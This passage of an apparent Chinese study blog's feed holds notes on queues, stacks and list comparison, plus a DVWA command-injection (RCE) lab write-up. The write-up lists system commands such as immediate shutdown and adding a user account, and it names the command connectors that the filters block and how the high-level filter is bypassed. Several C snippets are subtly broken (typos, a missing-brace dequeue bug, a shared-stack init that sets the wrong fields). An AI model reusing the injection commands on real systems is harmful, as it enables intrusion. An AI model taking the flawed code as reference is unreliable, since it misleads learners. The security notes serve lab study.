<h3 id="入队操作"><a href="#入队操作" class="headerlink" title="入队操作"></a>入队操作</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">EnQueue</span><span class="params">(SqQueue &amp;Q,ElemType x)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>((Q.rear+<span class="number">1</span>)%MaxSize==Q.front )</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;               <span class="comment">//队满报错</span></span><br><span class="line">    Q.data[Q.rear] = x;               <span class="comment">//新元素插入队尾</span></span><br><span class="line">    Q.rear = (Q.rear + <span class="number">1</span>)%MaxSize;    <span class="comment">//队尾指针加1取模</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="出队操作和查询队头操作"><a href="#出队操作和查询队头操作" class="headerlink" title="出队操作和查询队头操作"></a>出队操作和查询队头操作</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">DeQueue</span><span class="params">(SqQueue &amp;Q,Elemtype &amp;x)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(Q.rear == Q.front)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    x = Q.data[Q.front];</span><br><span class="line">    Q.front =(Q.front+<span class="number">1</span>)%MaxSize;   <span class="comment">//删除这一句后就是查询队头操作</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="判断队列已满-已空-元素个数"><a href="#判断队列已满-已空-元素个数" class="headerlink" title="判断队列已满/已空/元素个数"></a>判断队列已满/已空/元素个数</h3><p>元素个数：（rear+MaxSize-front)%MaxSize</p>
<p>方案一：</p>
<p>已满：(Q.rear+1)%MaxSize==Q.front</p>
<p>已空：Q.rear == Q.front</p>
<p>方案二：</p>
<p>增加一个变量 int size  插入成功 size++ 删除成功size — 初始化  size=0</p>
<p>队满条件：size==MaxSize    队空条件：size ==0</p>
<p>方案三：</p>
<p>增加一个变量tag（最近进行的是删除赋值为0，插入赋值为1，初始化tag=0）</p>
<p>原理：只有删除操作才可能导致队空，只有插入操作才可能导致队满</p>
<p>队满条件：front==rear&amp;&amp;tag=1 </p>
<p>队空条件：front==rear&amp;&amp;tag=0</p>
<h3 id="其他出题方法"><a href="#其他出题方法" class="headerlink" title="其他出题方法"></a>其他出题方法</h3><p><img src="/2022/08/13/%E9%98%9F%E5%88%97/image-20220603170120078.png" alt></p>
<p>初始化的时候设置rear=MaxSize-1 front=0</p>
<p><img src="/2022/08/13/%E9%98%9F%E5%88%97/image-20220603170229143.png" style="zoom: 67%;"><img src="/2022/08/13/%E9%98%9F%E5%88%97/image-20220603170342160-16604622170741.png" style="zoom: 67%;"></p>
<p>判空：方案一：牺牲一个存储单元</p>
<pre><code>       方案二：设置变量tag或size
</code></pre><h2 id="队列的链式存储结构"><a href="#队列的链式存储结构" class="headerlink" title="队列的链式存储结构"></a>队列的链式存储结构</h2><h3 id="链式实现及初始化"><a href="#链式实现及初始化" class="headerlink" title="链式实现及初始化"></a>链式实现及初始化</h3><h4 id="带头结点"><a href="#带头结点" class="headerlink" title="带头结点"></a>带头结点</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LinkNode</span>&#123;</span></span><br><span class="line">    ElemType data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">LinkNode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;LinkNode;  </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    LinkNode *front,*rear;</span><br><span class="line">&#125;LinkQueue;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">InitQueue</span><span class="params">(LinkQueue &amp;Q)</span>&#123;</span><br><span class="line">    <span class="comment">//初始时front，rear都指向头结点</span></span><br><span class="line">    Q.front=Q.rear=(LinkNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LinkNode));</span><br><span class="line">    Q.front-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//判空</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">IsEmpty</span><span class="params">(LinkQueue Q)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(Q.front==Q.rear)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">testLinkQueue</span><span class="params">()</span>&#123;</span><br><span class="line">    LinkQueue Q;</span><br><span class="line">    InitQueue(Q);</span><br><span class="line">    <span class="comment">//后续操作</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/13/%E9%98%9F%E5%88%97/image-20220603171845086.png" style="zoom: 67%;"></p>
<h4 id="不带头结点"><a href="#不带头结点" class="headerlink" title="不带头结点"></a>不带头结点</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//初始化</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">InitQueue</span><span class="params">(LinkQueue &amp;Q)</span>&#123;</span><br><span class="line">    Q.front=<span class="literal">NULL</span>;</span><br><span class="line">    Q.rear=<span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//判空</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">IsEmpty</span><span class="params">(LinkQueue Q)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(Q.front==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/13/%E9%98%9F%E5%88%97/image-20220603172140271.png" style="zoom:80%;"></p>
<h3 id="入队"><a href="#入队" class="headerlink" title="入队"></a>入队</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//新元素入队（带头结点）</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">EnQueue</span><span class="params">(LinkQueue &amp;Q,ElemType x)</span>&#123;</span><br><span class="line">    LinkNode *s=(LinkNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LinkNode));</span><br><span class="line">    s-&gt;data=x;</span><br><span class="line">    s-&gt;next=null;</span><br><span class="line">    Q.rear-&gt;next=s;     <span class="comment">//新结点插入到rear之后</span></span><br><span class="line">    Q.rear=s;           <span class="comment">//修改rear指针</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//新元素入队（不带头结点）</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">EnQueue</span><span class="params">(LinkQueue &amp;Q,ElemType x)</span>&#123;</span><br><span class="line">    LinkNode *s=(LinkNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LinkNode));</span><br><span class="line">    s-&gt;data=x;</span><br><span class="line">    s-&gt;next=null;</span><br><span class="line">    <span class="keyword">if</span> (Q.front == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        Q.front = s;</span><br><span class="line">        Q。rear = s;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        Q.rear-&gt;next = s;</span><br><span class="line">        Q,rear = s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="出队"><a href="#出队" class="headerlink" title="出队"></a>出队</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//队头元素出队（带头结点）</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">DeQueue</span><span class="params">(LinkQueue &amp;Q,ElemType &amp;x)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(Q.front==Q.rear)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;               <span class="comment">//空队</span></span><br><span class="line">    LinkNode *p=Q.front-&gt;next;</span><br><span class="line">    x=p-&gt;data;                      <span class="comment">//变量x返回头元素</span></span><br><span class="line">    Q.front-&gt;next=p-&gt;next;          <span class="comment">//修改头结点的next指针</span></span><br><span class="line">    <span class="keyword">if</span>(Q.rear==p)                   <span class="comment">//最后一个结点出队</span></span><br><span class="line">        Q.rear=Q.front;             <span class="comment">//修改rear指针</span></span><br><span class="line">    <span class="built_in">free</span>(p);                        <span class="comment">//释放节点空间</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//队头元素出队（不带头结点）</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">DeQueue</span><span class="params">(LinkQueue &amp;Q,ElemType &amp;x)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(Q.front==Q.rear)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;               <span class="comment">//空队</span></span><br><span class="line">    LinkNode *p=Q.front;</span><br><span class="line">    x=p-&gt;data;                      <span class="comment">//变量x返回头元素</span></span><br><span class="line">    Q.front=p-&gt;next;          <span class="comment">//修改头结点的next指针</span></span><br><span class="line">    <span class="keyword">if</span>(Q.rear==p)                   <span class="comment">//最后一个结点出队</span></span><br><span class="line">        Q.rear=null;              <span class="comment">//front指向null</span></span><br><span class="line">        Q.front=null;             <span class="comment">//修改rear指针指向NULL</span></span><br><span class="line">    <span class="built_in">free</span>(p);                        <span class="comment">//释放节点空间</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="队列满的情况"><a href="#队列满的情况" class="headerlink" title="队列满的情况"></a>队列满的情况</h3><p>链式存储——一般不会队满，除非内存不足</p>
<h2 id="双端队列"><a href="#双端队列" class="headerlink" title="双端队列"></a>双端队列</h2><p><img src="/2022/08/13/%E9%98%9F%E5%88%97/image-20220603174425521.png" style="zoom: 67%;"></p>
<p><img src="/2022/08/13/%E9%98%9F%E5%88%97/image-20220603174505573.png" style="zoom:67%;"></p>
]]></content>
      <tags>
        <tag>数据结构</tag>
        <tag>队列</tag>
      </tags>
  </entry>
  <entry>
    <title>栈</title>
    <url>/2022/08/13/%E6%A0%88/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>s栈的初步理解以及顺序栈和链栈定义和基本操作的代码实现</p>
<span id="more"></span>
<h2 id="栈的定义"><a href="#栈的定义" class="headerlink" title="栈的定义"></a>栈的定义</h2><p>栈（stack）是值允许在一端进行插入或者删除操作的线性表</p>
<p><img src="/2022/08/13/%E6%A0%88/image-20220602162636874.png" style="zoom:50%;"></p>
<h3 id="重要术语"><a href="#重要术语" class="headerlink" title="重要术语"></a>重要术语</h3><p>空栈，栈顶 ，栈底<img src="/2022/08/13/%E6%A0%88/image-20220602162853052.png" alt></p>
<p>逻辑结构：与普通线性表相同</p>
<h3 id="栈的基本操作"><a href="#栈的基本操作" class="headerlink" title="栈的基本操作"></a>栈的基本操作</h3><p><img src="/2022/08/13/%E6%A0%88/image-20220602163140637.png" alt></p>
<p>进栈和出栈</p>
<p><img src="/2022/08/13/%E6%A0%88/image-20220602163335955.png" style="zoom:80%;"></p>
<h2 id="顺序栈的实现"><a href="#顺序栈的实现" class="headerlink" title="顺序栈的实现"></a>顺序栈的实现</h2><h3 id="初始化和判空"><a href="#初始化和判空" class="headerlink" title="初始化和判空"></a>初始化和判空</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 10                  <span class="comment">//定义栈中元素的最大个数</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    ElemType data[MaxSize];         <span class="comment">//静态数组存放栈中元素</span></span><br><span class="line">    <span class="type">int</span> top;                        <span class="comment">//栈顶指针</span></span><br><span class="line">&#125; SqStack;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化栈</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">InitStack</span><span class="params">(SqStack &amp;S)</span>&#123;</span><br><span class="line">    S.top=<span class="number">-1</span>;                        <span class="comment">//初始化栈顶指针         </span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//因为初始化是s.top=-1</span></span><br><span class="line"><span class="comment">//判断栈空</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">StackEmpty</span><span class="params">(SqStack S)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(S.top==<span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">testStack</span><span class="params">()</span>&#123;</span><br><span class="line">	SqStack S;   <span class="comment">//声明一个顺序栈（分配空间）</span></span><br><span class="line">    <span class="comment">//..后续操作。。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>顺序存储：给各个数据元素分配连续的存储空间，大小为MaxSize*sizeof(ElemType)</p>
<h3 id="进栈操作"><a href="#进栈操作" class="headerlink" title="进栈操作"></a>进栈操作</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">Push</span><span class="params">(SqStack &amp;S,ElemType x)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(S.top==MaxSize<span class="number">-1</span>)   <span class="comment">//栈满报错</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    S.top = S.top+<span class="number">1</span>;        <span class="comment">//指针+1</span></span><br><span class="line">    S.data[S.top]=x;        <span class="comment">//新元素入栈       //替换为S.data[++S.top]=x;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="出栈和读栈顶元素操作"><a href="#出栈和读栈顶元素操作" class="headerlink" title="出栈和读栈顶元素操作"></a>出栈和读栈顶元素操作</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//出栈操作</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">Pop</span><span class="params">(SqStack &amp;S,ElemType &amp;x)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(S.top == <span class="number">-1</span>)          <span class="comment">//栈空报错</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    x=S.data[S.top];</span><br><span class="line">    S.top = S.top <span class="number">-1</span>;        <span class="comment">//x=S.data[S.top--]</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//读栈顶元素</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">GetTop</span><span class="params">(SqStack S,ElemType &amp;x)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(S.top == <span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    x = S.data[S.top];</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>top = 0时，栈满时top=maxsize=10</p>
<p>top = -1时，栈满是top=9</p>
<p>二者的入栈出栈操作正好是翻过来</p>
<h3 id="共享栈"><a href="#共享栈" class="headerlink" title="共享栈"></a>共享栈</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 10              <span class="comment">//定义栈中元素的最大个数</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">	ElemType data[MaxSize];     <span class="comment">//静态数组存放栈中元素</span></span><br><span class="line">    <span class="type">int</span> top0;                   <span class="comment">//0号栈栈顶指针</span></span><br><span class="line">    <span class="type">int</span> top1;                   <span class="comment">//一号栈栈顶指针</span></span><br><span class="line">&#125;ShStack;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化栈</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">InitStack</span><span class="params">(ShStack &amp;S)</span>&#123;</span><br><span class="line">    S.top=<span class="number">-1</span>;                   <span class="comment">//初始化栈顶指针</span></span><br><span class="line">    S.top=MaxSize;</span><br><span class="line">&#125;                              <span class="comment">//栈满的条件：top0 + 1 == top1</span></span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/13/%E6%A0%88/image-20220603162012226.png" style="zoom: 50%;"></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><img src="/2022/08/13/%E6%A0%88/image-20220603161547608.png" alt></p>
<h2 id="链栈"><a href="#链栈" class="headerlink" title="链栈"></a>链栈</h2><p>用链式存储的栈也是一种单链表，只是在插入和删除进行了限制，例如头插法就是入栈，删除第一个结点就是出栈</p>
<h3 id="链栈的定义"><a href="#链栈的定义" class="headerlink" title="链栈的定义"></a>链栈的定义</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Linknode</span>&#123;</span></span><br><span class="line">    ElemType data;              <span class="comment">//数据域</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Linknode</span> *<span class="title">next</span>;</span>      <span class="comment">//指针域</span></span><br><span class="line">&#125; *LiStack;                     <span class="comment">//栈类型定义</span></span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/13/%E6%A0%88/image-20220603162308266.png" alt></p>
]]></content>
      <tags>
        <tag>数据结构</tag>
        <tag>栈</tag>
      </tags>
  </entry>
  <entry>
    <title>顺序表和链表的比较</title>
    <url>/2022/08/11/%E9%A1%BA%E5%BA%8F%E8%A1%A8%E5%92%8C%E9%93%BE%E8%A1%A8%E7%9A%84%E6%AF%94%E8%BE%83/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>对前几篇的总结，比较线性表中顺序表和链表的异同</p>
<span id="more"></span>
<h2 id="顺序表和链表的比较"><a href="#顺序表和链表的比较" class="headerlink" title="顺序表和链表的比较"></a>顺序表和链表的比较</h2><h3 id="逻辑结构"><a href="#逻辑结构" class="headerlink" title="逻辑结构"></a>逻辑结构</h3><p>都属于线性表，都是线性结构</p>
<h3 id="存储结构"><a href="#存储结构" class="headerlink" title="存储结构"></a>存储结构</h3><p><strong>顺序表</strong>   优点：支持随机存取，存储密度高</p>
<pre><code>          缺点：大片连续空间分配不方便，改变容量不方便
</code></pre><p><strong>链表</strong>       优点：离散的小空间分配方便，改变不容量方便</p>
<pre><code>           缺点：不可随机存取，存储密度低
</code></pre><h3 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h3><p>创销 增删改查</p>
<h4 id="创"><a href="#创" class="headerlink" title="创"></a>创</h4><p>顺序表：预分配大片连续空间。静态分配：静态数组（空间大小不可改变）。动态分配：动态数组（malloc，free函数，但需要大量移动数据）</p>
<p>链表：只需分配一个头结点（或者头指针）</p>
<h4 id="销"><a href="#销" class="headerlink" title="销"></a>销</h4><p>顺序表：修改length=0，静态数组：系统自动回收空间。动态数组：需要手动free</p>
<p>链表：一次删除各个结点（free）</p>
<p><img src="/2022/08/11/%E9%A1%BA%E5%BA%8F%E8%A1%A8%E5%92%8C%E9%93%BE%E8%A1%A8%E7%9A%84%E6%AF%94%E8%BE%83/image-20220519211257486.png" alt></p>
<h4 id="增，删"><a href="#增，删" class="headerlink" title="增，删"></a>增，删</h4><p>顺序表：移动元素，时间复杂度O(n),时间花销主要来自移动元素</p>
<p>链表：修改指针，时间复杂度O(n),时间花销来自查找目标元素</p>
<p>链表的效率比顺序表高得多</p>
<h4 id="查"><a href="#查" class="headerlink" title="查"></a>查</h4><p>顺序表：按位查找：O(1)</p>
<pre><code>          按位查找：O(n)，若表内元素有序，可在
</code></pre><script type="math/tex; mode=display">
O(log_2n)</script><p>时间内找到</p>
<p>链表: 按位查找：O(n)</p>
<pre><code>     按值查找：O(n)
</code></pre><p>顺序表效率更好</p>
<p><img src="/2022/08/11/%E9%A1%BA%E5%BA%8F%E8%A1%A8%E5%92%8C%E9%93%BE%E8%A1%A8%E7%9A%84%E6%AF%94%E8%BE%83/image-20220519212208066-16604616041971.png" alt></p>
<h4 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h4><p>表长难以预估，经常要增加/删除元素 ——链表</p>
<p>表长可以预估，查询（搜索）操作较多  ——顺序表</p>
<h3 id="开放式问题的答题思路"><a href="#开放式问题的答题思路" class="headerlink" title="开放式问题的答题思路"></a>开放式问题的答题思路</h3><p><img src="/2022/08/11/%E9%A1%BA%E5%BA%8F%E8%A1%A8%E5%92%8C%E9%93%BE%E8%A1%A8%E7%9A%84%E6%AF%94%E8%BE%83/image-20220519212403852.png" alt></p>
]]></content>
      <tags>
        <tag>数据结构</tag>
        <tag>线性表</tag>
      </tags>
  </entry>
  <entry>
    <title>RCE</title>
    <url>/2022/08/10/RCE/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>通过dvwa靶场进行对RCE漏洞的学习和复现</p>
<span id="more"></span>
<h1 id="命令执行漏洞（RCE"><a href="#命令执行漏洞（RCE" class="headerlink" title="命令执行漏洞（RCE)"></a>命令执行漏洞（RCE)</h1><h2 id="命令连接符"><a href="#命令连接符" class="headerlink" title="命令连接符"></a>命令连接符</h2><p><img src="/2022/08/10/RCE/101.png" style="zoom:67%;"></p>
<h2 id="常用的cmd命令"><a href="#常用的cmd命令" class="headerlink" title="常用的cmd命令"></a>常用的cmd命令</h2><p>whoami——查看当前用户名<br>ipconfig——查看网卡信息<br>shutdown -s -t 0——关机————（-s：shutdown    -t 0 ：time 0    立即关机）<br>net user [username] [password] /add——增加一个用户名为username密码为password的新用户<img src="/2022/08/10/RCE/201.png" alt><br>type [file_name]——查看filename文件内容<br><img src="/2022/08/10/RCE/301.png" style="zoom:67%;"></p>
<h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><h3 id="Command-Injection-防御-low"><a href="#Command-Injection-防御-low" class="headerlink" title="Command Injection 防御 low"></a>Command Injection 防御 low</h3><h4 id="注入点-代码"><a href="#注入点-代码" class="headerlink" title="注入点(代码)"></a>注入点(代码)</h4><p><img src="/2022/08/10/RCE/401.png" alt></p>
<h4 id="运行实例"><a href="#运行实例" class="headerlink" title="运行实例"></a>运行实例</h4><p><img src="/2022/08/10/RCE/501.png" style="zoom:67%;"></p>
<p><img src="/2022/08/10/RCE/601.png" style="zoom:67%;"></p>
<h3 id="Command-Injection-防御-low-1"><a href="#Command-Injection-防御-low-1" class="headerlink" title="Command Injection 防御 low"></a>Command Injection 防御 low</h3><p>防御命令执行的最高效的方法，就是过滤命令连接符<br>将| ；&amp; || &amp;&amp; 符号替换成空，或判断用户输入这些符号就终止执行</p>
<h4 id="Command-Injection-防御-medium"><a href="#Command-Injection-防御-medium" class="headerlink" title="Command Injection 防御 medium"></a>Command Injection 防御 medium</h4><p><img src="/2022/08/10/RCE/701.png" alt><br>str_replace(find,replace,string,count)：字符替换函数。find：规定要查找的值    replace：规定替换find中的值    string：被搜索的字符串  count：对替换数进行计数的变量<br>array_keys(array,value,strict):返回一个包含所有键名的一个新数组。array：规定数组    value：指定健值（可选)    strict：可能的值：true  false  是否依赖类型</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//需要替换的元素少于查到到的元素</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$find</span> = <span class="keyword">array</span>(<span class="string">&quot;Hello&quot;</span>,<span class="string">&quot;world&quot;</span>);</span><br><span class="line"><span class="variable">$replace</span> = <span class="keyword">array</span>(<span class="string">&quot;B&quot;</span>);</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">&quot;Hello&quot;</span>,<span class="string">&quot;world&quot;</span>,<span class="string">&quot;!&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">str_replace</span>(<span class="variable">$find</span>,<span class="variable">$replace</span>,<span class="variable">$arr</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">运行结果</span><br><span class="line"><span class="title function_ invoke__">Array</span> ( [<span class="number">0</span>] =&gt; B [<span class="number">1</span>] =&gt; [<span class="number">2</span>] =&gt; ! )</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$substitutions</span> = <span class="keyword">array</span>( </span><br><span class="line">    <span class="string">&#x27;&amp;&amp;&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>, </span><br><span class="line">); </span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">array_keys</span>(<span class="variable">$substitutions</span>));</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$substitutions</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">运行结果</span><br><span class="line"><span class="title function_ invoke__">Array</span> ( [<span class="number">0</span>] =&gt; &amp;&amp; [<span class="number">1</span>] =&gt; ; ) <span class="title function_ invoke__">Array</span> ( [&amp;&amp;] =&gt; [;] =&gt; )</span><br></pre></td></tr></table></figure>
<h3 id="Command-Injection-攻击-medium"><a href="#Command-Injection-攻击-medium" class="headerlink" title="Command Injection 攻击 medium"></a>Command Injection 攻击 medium</h3><p>在medium防御中看到只过滤；和&amp;&amp;，所以使用其他三种即可。<br><img src="/2022/08/10/RCE/801.png" alt="image-20220805155321480" style="zoom:67%;"><br><img src="/2022/08/10/RCE/901.png" alt="image-20220805155720842" style="zoom:67%;"></p>
<h3 id="Command-Injection-防御-high"><a href="#Command-Injection-防御-high" class="headerlink" title="Command Injection 防御 high"></a>Command Injection 防御 high</h3><p><img src="/2022/08/10/RCE/1001.png" alt><br><strong>注意上面‘| ’拦截并非是|，而是|加空格</strong>————代码不规范导致的漏洞</p>
<h3 id="Command-Injection-攻击-high"><a href="#Command-Injection-攻击-high" class="headerlink" title="Command Injection 攻击 high"></a>Command Injection 攻击 high</h3><p><img src="/2022/08/10/RCE/1101.png" style="zoom:67%;"></p>
<h3 id="Command-Injection-防御-impossible"><a href="#Command-Injection-防御-impossible" class="headerlink" title="Command Injection 防御 impossible"></a>Command Injection 防御 impossible</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123; </span><br><span class="line">    <span class="comment">// Check Anti-CSRF token </span></span><br><span class="line">    <span class="title function_ invoke__">checkToken</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> ); </span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];        <span class="comment">//将输入内容赋值给变量$target</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$target</span> );      <span class="comment">//去除用户输入的\</span></span><br><span class="line">    <span class="comment">// Split the IP into 4 octects </span></span><br><span class="line">    <span class="variable">$octet</span> = <span class="title function_ invoke__">explode</span>( <span class="string">&quot;.&quot;</span>, <span class="variable">$target</span> );       <span class="comment">//把用户输入的数据根据.分开</span></span><br><span class="line">    <span class="comment">// Check IF each octet is an integer </span></span><br><span class="line">    <span class="keyword">if</span>( ( <span class="title function_ invoke__">is_numeric</span>( <span class="variable">$octet</span>[<span class="number">0</span>] ) ) &amp;&amp; ( <span class="title function_ invoke__">is_numeric</span>( <span class="variable">$octet</span>[<span class="number">1</span>] ) ) &amp;&amp; ( <span class="title function_ invoke__">is_numeric</span>( <span class="variable">$octet</span>[<span class="number">2</span>] ) ) &amp;&amp; ( <span class="title function_ invoke__">is_numeric</span>( <span class="variable">$octet</span>[<span class="number">3</span>] ) ) &amp;&amp; ( <span class="title function_ invoke__">sizeof</span>( <span class="variable">$octet</span> ) == <span class="number">4</span> ) ) <span class="comment">//分别判断分成的四个部分是不是数字，并判断是不是四个数字</span></span><br><span class="line">    	&#123; </span><br><span 